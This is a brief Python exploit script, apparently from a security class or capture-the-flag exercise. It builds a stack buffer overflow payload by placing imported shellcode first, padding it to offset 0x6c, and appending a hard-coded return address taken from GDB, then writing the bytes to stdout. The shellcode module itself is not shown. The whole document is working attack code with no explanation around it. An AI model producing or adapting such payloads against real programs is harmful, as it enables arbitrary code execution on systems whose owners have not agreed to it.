from shellcode import shellcode
import sys

# Padding based on the function's stack frame
padding = b'A' * (0x6c - len(shellcode))

# Address of the vulnerable function (use the value obtained from GDB)
return_address = 0xffffd858

payload = shellcode + padding + return_address.to_bytes(4, 'little')

sys.stdout.buffer.write(payload)

# from shellcode import shellcode
# import sys
# sys.stdout.buffer.write(shellcode)